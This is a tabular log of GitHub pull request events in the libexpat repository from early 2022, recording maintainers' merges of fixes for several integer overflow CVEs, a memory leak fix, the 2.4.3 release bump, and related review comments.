536,Assigned,2022-01-01 14:59:36,hartwork,unfork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
536,OpenPR,2022-01-01 14:59:36,hartwork,unfork_merge,,
536,MergePR,2022-01-01 15:49:58,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5831795603"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/5cde0d78fc454ebc4b5631926e976a764e0bace6""}"
536,DeleteBranch,2022-01-01 15:50:12,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5831795728"", ""commit_url"": null}"
538,OpenPR,2022-01-04 16:35:07,hartwork,unfork_merge,,
538,Labeled,2022-01-04 16:37:26,hartwork,unfork_merge,security,
538,HeadRefForcePushed,2022-01-05 17:28:50,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5847868112"", ""commit_url"": null}"
538,HeadRefForcePushed,2022-01-06 15:24:51,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5852879712"", ""commit_url"": null}"
538,RenameTitle,2022-01-07 22:11:10,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] lib: Prevent integer overflow on m_groupSize in function doProlog (fixes #532)"", ""to"": ""[W.I.P.] [CVE-2021-46143] lib: Prevent integer overflow on m_groupSize in function doProlog (fixes #532)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860205818""}"
538,HeadRefForcePushed,2022-01-07 22:19:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860231516"", ""commit_url"": null}"
538,CrossReferenced,2022-01-08 00:29:32,hartwork,unfork_merge,[CVE-2022-22822 to CVE-2022-22827] lib: Prevent more integer overflows,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/539"", ""is_pull_request"": true}}"
538,CrossReferenced,2022-01-08 00:31:31,hartwork,unfork_merge,Release Expat 2.4.3,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/533"", ""is_pull_request"": false}}"
538,Revise,2022-01-10 15:51:14,hartwork,unfork_merge,lib: Prevent integer overflow on m_groupSize in function doProlog (CVE-2021-46143),"{""sha"": ""85ae9a2d7d0e9358f356b33977b842df8ebaec2b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-25T19:52:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-10T15:51:14Z""}}"
538,Revise,2022-01-10 15:51:50,hartwork,unfork_merge,Changes: Document integer overflow CVE-2021-46143,"{""sha"": ""f488b072b75d090f76aa61146ddf743813e9b81b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-05T17:25:41Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-10T15:51:50Z""}}"
538,HeadRefForcePushed,2022-01-10 15:52:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5866973570"", ""commit_url"": null}"
538,RenameTitle,2022-01-10 17:00:40,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] [CVE-2021-46143] lib: Prevent integer overflow on m_groupSize in function doProlog (fixes #532)"", ""to"": ""[CVE-2021-46143] lib: Prevent integer overflow on m_groupSize in function doProlog (fixes #532)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5867428905""}"
538,MergePR,2022-01-10 17:01:11,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5867432517"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/82c11af9d3dafc1b086a15efecd6ec07b6e13613""}"
538,DeleteBranch,2022-01-10 17:01:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5867435091"", ""commit_url"": null}"
539,Labeled,2022-01-08 00:28:21,hartwork,unfork_merge,security,
539,OpenPR,2022-01-08 00:28:21,hartwork,unfork_merge,,
539,CrossReferenced,2022-01-08 00:31:31,hartwork,unfork_merge,Release Expat 2.4.3,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/533"", ""is_pull_request"": false}}"
539,RenameTitle,2022-01-08 00:50:26,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] Prevent more integer overflows"", ""to"": ""[W.I.P.] lib: Prevent more integer overflows""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5860591050""}"
539,HeadRefForcePushed,2022-01-08 15:36:41,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5861336401"", ""commit_url"": null}"
539,RenameTitle,2022-01-08 15:37:11,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] lib: Prevent more integer overflows"", ""to"": ""[W.I.P.] [CVE-2022-22822 to CVE-2022-22827] lib: Prevent more integer overflows""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5861336866""}"
539,Revise,2022-01-10 17:01:38,hartwork,unfork_merge,linux.yml: Add some -m32 coverage to -DEXPAT_ATTR_INFO=ON,"{""sha"": ""653bcf9c25dca2a5b223fac88fc177bd0037ef6f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-07T22:30:30Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-10T17:01:38Z""}}"
539,HeadRefForcePushed,2022-01-10 17:02:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5867445287"", ""commit_url"": null}"
539,Revise,2022-01-12 16:01:55,hartwork,unfork_merge,"lib: Prevent integer overflow at multiple places (CVE-2022-22822 to CVE-2022-22827)

The involved functions are:
- addBinding (CVE-2022-22822)
- build_model (CVE-2022-22823)
- defineAttribute (CVE-2022-22824)
- lookup (CVE-2022-22825)
- nextScaffoldPart (CVE-2022-22826)
- storeAtts (CVE-2022-22827)","{""sha"": ""9f93e8036e842329863bf20395b8fb8f73834d9e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-12-30T21:46:03Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-12T16:01:55Z""}}"
539,Revise,2022-01-12 16:01:55,hartwork,unfork_merge,Changes: Document CVE-2022-22822 to CVE-2022-22827,"{""sha"": ""8e9f6ea08c0fdded06efcc4c124872bb4c82c89e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-07T22:51:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-12T16:01:55Z""}}"
539,HeadRefForcePushed,2022-01-12 16:02:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5881363364"", ""commit_url"": null}"
539,RenameTitle,2022-01-13 18:56:31,hartwork,unfork_merge,,"{""rename"": {""from"": ""[W.I.P.] [CVE-2022-22822 to CVE-2022-22827] lib: Prevent more integer overflows"", ""to"": ""[CVE-2022-22822 to CVE-2022-22827] lib: Prevent more integer overflows""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5889731531""}"
539,MergePR,2022-01-13 18:56:36,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5889731991"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/919a2bec5e12e6285031308e6da86f250b21d166""}"
539,DeleteBranch,2022-01-13 18:56:56,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5889733854"", ""commit_url"": null}"
539,CrossReferenced,2022-03-28 14:10:53,fleimkeipa,unfork_merge,CVE-2022-22827 | libexpat1 (CWE-190),"{""reference"": {""url"": ""https://api.github.com/repos/fleimkeipa/ProjectEulerProblems/issues/2"", ""is_pull_request"": false}}"
541,SubmitCommit,2022-01-09 22:04:13,hartwork,unfork_merge,run.sh.in: Do not use Wine with Cygwin and MSYS2,"{""sha"": ""572ef7a2acdd50f82426eedb8facdb7fe0beab12"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-09T21:57:13Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-09T22:04:13Z""}}"
541,OpenPR,2022-01-09 22:04:32,hartwork,unfork_merge,,
541,Labeled,2022-01-09 22:04:33,hartwork,unfork_merge,bug,
541,Labeled,2022-01-09 22:04:33,hartwork,unfork_merge,windows,
541,CrossReferenced,2022-01-09 22:24:13,hartwork,unfork_merge,Release Expat 2.4.3,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/533"", ""is_pull_request"": false}}"
541,CrossReferenced,2022-01-10 02:33:37,hartwork,unfork_merge,"expat - upgrade to 2.4.2, remove unneeded patch.","{""reference"": {""url"": ""https://api.github.com/repos/msys2/MINGW-packages/issues/10521"", ""is_pull_request"": true}}"
541,MergePR,2022-01-10 15:26:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5866796552"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/b6b432bad559b7dcd60ed3da36db3881abb08457""}"
541,DeleteBranch,2022-01-10 15:48:24,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5866945996"", ""commit_url"": null}"
543,SubmitCommit,2022-01-13 19:02:42,hartwork,unfork_merge,"Bump version info from 9:2:8 to 9:3:8

See https://verbump.de/ for what these numbers do","{""sha"": ""2a6019d0fb55452cef6336d99099b3bdfbb85d18"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:02:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:02:42Z""}}"
543,SubmitCommit,2022-01-13 19:08:47,hartwork,unfork_merge,Bump version to 2.4.3,"{""sha"": ""d102671bfe3fe9a87af5efd2ffb2738a80b6fcca"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:07:41Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:08:47Z""}}"
543,OpenPR,2022-01-13 22:30:40,hartwork,unfork_merge,,
543,Labeled,2022-01-13 22:30:40,hartwork,unfork_merge,security,
543,Labeled,2022-01-13 22:30:41,hartwork,unfork_merge,releasing,
543,CrossReferenced,2022-01-13 22:32:49,hartwork,unfork_merge,Release Expat 2.4.3,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/533"", ""is_pull_request"": false}}"
543,Revise,2022-01-13 22:45:22,hartwork,unfork_merge,Sync years in file headers,"{""sha"": ""6496a03d40764bab09d30433345dd392fc33a038"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T22:43:09Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T22:45:22Z""}}"
543,Revise,2022-01-13 22:47:43,hartwork,unfork_merge,Changes: Document #528 and #529,"{""sha"": ""09044348e1b76580c91391cdfd9ffee7b8db1bd2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:23:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T22:47:43Z""}}"
543,Revise,2022-01-13 22:47:57,hartwork,unfork_merge,Changes: Streamline item order for 2.4.3,"{""sha"": ""87638f86fddb0811fe5523ecad95c0f9b3a167a2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:14:28Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T22:47:57Z""}}"
543,Revise,2022-01-13 22:47:57,hartwork,unfork_merge,Set expected release date for 2.4.3,"{""sha"": ""fc4652b2b301adb95a7b0b3a731033648f379869"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T19:13:46Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-13T22:47:57Z""}}"
543,HeadRefForcePushed,2022-01-13 22:49:19,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5890963871"", ""commit_url"": null}"
543,CrossReferenced,2022-01-14 16:13:21,rifen,unfork_merge,"Nautobot container scores an ""F"" from security scanner","{""reference"": {""url"": ""https://api.github.com/repos/nautobot/nautobot/issues/1111"", ""is_pull_request"": false}}"
543,CrossReferenced,2022-01-14 16:53:34,hartwork,unfork_merge,[CVE-2021-46143] Crafted XML file can cause integer overflow on m_groupSize in function doProlog,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/532"", ""is_pull_request"": false}}"
543,MergePR,2022-01-16 13:44:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5900321936"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/57c7da69b78e3698e112a6b5da19d5109b8232d1""}"
543,DeleteBranch,2022-01-16 13:44:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5900322202"", ""commit_url"": null}"
543,ReviewApproved,2022-12-24 03:45:20,Upndup,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/543#pullrequestreview-1229504867""}"
545,Labeled,2022-01-20 04:07:54,hartwork,unfork_merge,bug,
545,OpenPR,2022-01-20 04:07:54,hartwork,unfork_merge,,
545,ReviewComment,2022-01-20 04:27:25,timbray,unfork_merge,,"{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/545#pullrequestreview-857663980""}"
545,ReviewApproved,2022-01-20 04:27:42,timbray,unfork_merge,,"{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/545#pullrequestreview-857664318""}"
545,HeadRefForcePushed,2022-01-20 15:29:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5925845832"", ""commit_url"": null}"
545,RenameTitle,2022-01-20 16:01:11,hartwork,unfork_merge,,"{""rename"": {""from"": ""xmlwf: Fix a memory leak on output file opening error (fixes #544)"", ""to"": ""[>=2.3.0] xmlwf: Fix a memory leak on output file opening error (fixes #544)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5926129674""}"
545,HeadRefForcePushed,2022-01-20 16:26:55,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5926338773"", ""commit_url"": null}"
545,CrossReferenced,2022-01-22 15:00:47,hartwork,unfork_merge,[>=2.3.0] xmlwf: Memory leak on output file opening error,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/544"", ""is_pull_request"": false}}"
545,Revise,2022-01-24 14:41:32,hartwork,unfork_merge,xmlwf: Fix a memory leak on output file opening error,"{""sha"": ""85a6f8fcdb2bc1530934f8cf684bdab86f1f2a1c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-20T03:41:47Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-24T14:41:32Z""}}"
545,HeadRefForcePushed,2022-01-24 14:41:57,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5943017556"", ""commit_url"": null}"
545,MergePR,2022-01-24 17:45:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5944377288"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/5f100ffa78b74da8020b71d1582a8979193c1359""}"
545,DeleteBranch,2022-01-26 01:19:09,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5953787838"", ""commit_url"": null}"
550,Labeled,2022-01-23 20:05:35,hartwork,unfork_merge,bug,
550,OpenPR,2022-01-23 20:05:35,hartwork,unfork_merge,,
550,Labeled,2022-01-23 20:05:35,hartwork,unfork_merge,security,
550,HeadRefForcePushed,2022-01-23 20:07:13,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5938673708"", ""commit_url"": null}"
550,ReviewComment,2022-01-23 20:41:54,rillig,unfork_merge,,"{""author_association"": ""NONE"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/550#pullrequestreview-860369705""}"
550,IssueComment,2022-01-23 20:45:59,rillig,unfork_merge,Looks good to me as the code uses the same pattern as everywhere else to detect integer overflow.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1019563780"", ""author_association"": ""NONE""}"
550,HeadRefForcePushed,2022-01-23 20:46:44,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5938715142"", ""commit_url"": null}"
550,IssueComment,2022-01-23 21:08:14,hartwork,unfork_merge,"@rillig thanks for the review :+1: 

CVE request submitted to Mitre just now.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1019567716"", ""author_association"": ""MEMBER""}"
550,RenameTitle,2022-01-24 01:34:21,hartwork,unfork_merge,,"{""rename"": {""from"": ""Prevent XML_GetBuffer signed integer overflow"", ""to"": ""[CVE-2022-23852] Prevent XML_GetBuffer signed integer overflow""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5939118533""}"
550,IssueComment,2022-01-24 01:34:28,hartwork,unfork_merge,Got `CVE-2022-23852`,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1019633911"", ""author_association"": ""MEMBER""}"
550,Revise,2022-01-24 01:35:02,ferivoz,unfork_merge,lib: Detect and prevent integer overflow in XML_GetBuffer (CVE-2022-23852),"{""sha"": ""847a645152f5ebc10ac63b74b604d0c1a79fae40"", ""author"": {""name"": ""Samanta Navarro"", ""email"": ""ferivoz@riseup.net"", ""date"": ""2022-01-22T16:48:00Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-24T01:35:02Z""}}"
550,Revise,2022-01-24 01:37:47,hartwork,unfork_merge,tests: Cover integer overflow in XML_GetBuffer (CVE-2022-23852),"{""sha"": ""acf956f14bf79a5e6383a969aaffec98bfbc2e44"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-23T17:17:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-24T01:37:47Z""}}"
550,Revise,2022-01-24 01:37:47,hartwork,unfork_merge,Changes: Document CVE-2022-23852,"{""sha"": ""99cec436fbd9444f57ee74ca8ae4c0a13e561a4f"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-22T16:49:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-24T01:37:47Z""}}"
550,HeadRefForcePushed,2022-01-24 01:38:09,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5939127234"", ""commit_url"": null}"
550,IssueComment,2022-01-24 11:57:11,ferivoz,unfork_merge,Looks good to me as well. Thank you for extending the test into its own test case and adjusting the signed overflow check!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1020021945"", ""author_association"": ""CONTRIBUTOR""}"
550,IssueComment,2022-01-24 14:38:57,hartwork,unfork_merge,"@ferivoz thanks for the review :+1: 

Merging now...","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1020168517"", ""author_association"": ""MEMBER""}"
550,MergePR,2022-01-24 14:39:04,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5942993700"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/178d26f50af21ec23d6e43814b9b602590b5865c""}"
550,DeleteBranch,2022-01-24 14:40:31,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5943005533"", ""commit_url"": null}"
550,CrossReferenced,2022-01-25 09:52:49,mweinelt,unfork_merge,expat: add patches for CVE-2022-23852,"{""reference"": {""url"": ""https://api.github.com/repos/NixOS/nixpkgs/issues/156607"", ""is_pull_request"": true}}"
550,CrossReferenced,2022-01-27 09:44:34,Tzoockee,unfork_merge,[request] <Expat>/<2.4.4 > (CVE-2022-23852),"{""reference"": {""url"": ""https://api.github.com/repos/conan-io/conan-center-index/issues/9110"", ""is_pull_request"": false}}"
550,IssueCommentSupplement,2022-01-28 09:56:47,iamkarlson,unfork_merge,Can anyone who submitted a CVE explain in more detail what is this package for and what might be affected by using it? ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024056971"", ""author_association"": ""NONE""}"
550,IssueCommentSupplement,2022-01-28 13:41:50,hartwork,unfork_merge,@iamkarlson are you asking what libexpat is being used for in general? Have you read the project description? For an (incomplete) list of hardware and other Open Source software using libexpat please see https://libexpat.github.io/doc/users/ .,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024236715"", ""author_association"": ""MEMBER""}"
550,CrossReferenced,2022-01-31 11:11:53,Ilmarinen100,unfork_merge,[CVE-2022-23852] of underlying libexpat ,"{""reference"": {""url"": ""https://api.github.com/repos/astro/node-expat/issues/215"", ""is_pull_request"": false}}"
550,IssueCommentSupplement,2022-01-31 13:01:50,DominikBauer1,unfork_merge,"Hi, the CVSS value of 9.8 seems quite high for an integer overflow. Is there any malicious advantage that I don't see at the moment?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1025714708"", ""author_association"": ""NONE""}"
550,IssueCommentSupplement,2022-01-31 14:50:11,hartwork,unfork_merge,"@DominikBauer1 to my best knowledge it is unclear how much more than DoS can be gotten out of that overflow: The optimistic view is ""probably just DoS"" and the pessimistic one is ""this could be code execution"". That's why I wrote ""Impact is denial of service or more"" in the change log. I didn't suggest a score that high, but maybe the person who made that choice has information that I don't. Does that answer the question?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1025827841"", ""author_association"": ""MEMBER""}"
550,IssueCommentSupplement,2022-01-31 15:31:27,DominikBauer1,unfork_merge,"@hartwork Yes, that answers my question. Thanks for the quick reply.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1025899112"", ""author_association"": ""NONE""}"
550,IssueCommentSupplement,2022-02-08 19:25:41,iamkarlson,unfork_merge,"@hartwork yes, that's what I was looking for. We're using docker images and I wanted to remove all unpatched dependencies from them.  ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1032979111"", ""author_association"": ""NONE""}"
550,IssueCommentSupplement,2022-02-08 19:32:00,hartwork,unfork_merge,"@iamkarlson unless an app comes with their own bundled copy of libexpat (and most distros will patch bundles out for security reasons), updating libexpat in the distro will get the fix to all apps at once, because they all use that very instance, that's the idea. If you want to discuss this more, let's take it to e-mail, my contact is on the profile page, just so we don't spam everyone here with something that is not super specific to this very vulnerability fix. Okay? Thank you!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1032984745"", ""author_association"": ""MEMBER""}"
551,Labeled,2022-01-26 02:06:23,hartwork,unfork_merge,bug,
551,OpenPR,2022-01-26 02:06:23,hartwork,unfork_merge,,
551,Labeled,2022-01-26 02:06:23,hartwork,unfork_merge,security,
551,RenameTitle,2022-01-26 02:13:31,hartwork,unfork_merge,,"{""rename"": {""from"": ""Prevent integer overflow in function doProlog"", ""to"": ""lib: Prevent integer overflow in function doProlog""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5953942167""}"
551,HeadRefForcePushed,2022-01-26 02:19:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5953961741"", ""commit_url"": null}"
551,RenameTitle,2022-01-26 18:32:10,hartwork,unfork_merge,,"{""rename"": {""from"": ""lib: Prevent integer overflow in function doProlog"", ""to"": ""[CVE-2022-23990] lib: Prevent integer overflow in function doProlog""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5958713882""}"
551,IssueComment,2022-01-26 18:32:19,hartwork,unfork_merge,Got `CVE-2022-23990` just now,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1022478192"", ""author_association"": ""MEMBER""}"
551,Revise,2022-01-26 18:33:12,hartwork,unfork_merge,"lib: Prevent integer overflow in doProlog (CVE-2022-23990)

The change from ""int nameLen"" to ""size_t nameLen""
addresses the overflow on ""nameLen++"" in code
""for (; name[nameLen++];)"" right above the second
change in the patch.","{""sha"": ""ede41d1e186ed2aba88a06e84cac839b770af3a1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-26T01:36:43Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-26T18:33:12Z""}}"
551,Revise,2022-01-26 18:33:23,hartwork,unfork_merge,Changes: Document CVE-2022-23990,"{""sha"": ""6e3449594fb2f61c92fc561f51f82196fdd15d63"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-26T01:51:39Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-01-26T18:33:23Z""}}"
551,HeadRefForcePushed,2022-01-26 18:33:43,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5958721819"", ""commit_url"": null}"
551,IssueComment,2022-01-26 21:57:49,rillig,unfork_merge,"Looks good to me, same pattern as everywhere else. the data types are consistently `unsigned int` in this case.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1022640081"", ""author_association"": ""NONE""}"
551,MergePR,2022-01-26 22:16:10,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5959830598"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/5c168279c5ad4668e5e48fe13374fe7a7de4b573""}"
551,IssueCommentSupplement,2022-01-26 22:16:28,hartwork,unfork_merge,@rillig thanks for the review! :+1: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1022653956"", ""author_association"": ""MEMBER""}"
551,DeleteBranch,2022-01-29 21:16:15,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/5975536280"", ""commit_url"": null}"
551,Referenced,2022-03-09 23:24:23,jpuhlman,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6213687315"", ""commit_url"": ""https://api.github.com/repos/MontaVista-OpenSourceTechnology/poky/commits/de048edd45c24c82894fe75ad83252c39abab838""}"
551,Referenced,2022-04-06 21:54:48,jpuhlman,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/6383741848"", ""commit_url"": ""https://api.github.com/repos/MontaVista-OpenSourceTechnology/poky/commits/67cb1463ae5d28b22dfdc3729037894abc4830ce""}"
553,SubmitCommit,2022-01-28 18:27:15,czentgr,fork_merge,Fix compiler void* assignment to XML_Char* error,"{""sha"": ""f193925e138ec442e14e848a3ecb3e71a457cd5d"", ""author"": {""name"": ""czentgr"", ""email"": ""82243552+czentgr@users.noreply.github.com"", ""date"": ""2022-01-28T18:27:15Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-01-28T18:27:15Z""}}"
553,OpenPR,2022-01-28 18:36:00,czentgr,fork_merge,,
553,IssueComment,2022-01-28 18:54:49,1480c1,fork_merge,"Are you sure you are using the right compiler in the right mode? That seems like you are using a C++ compiler with C code, you might want to check you are using the c compiler and not the c++ compiler or check to see if you can use something like g++'s -fpermissive","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1024514272"", ""author_association"": ""NONE""}"
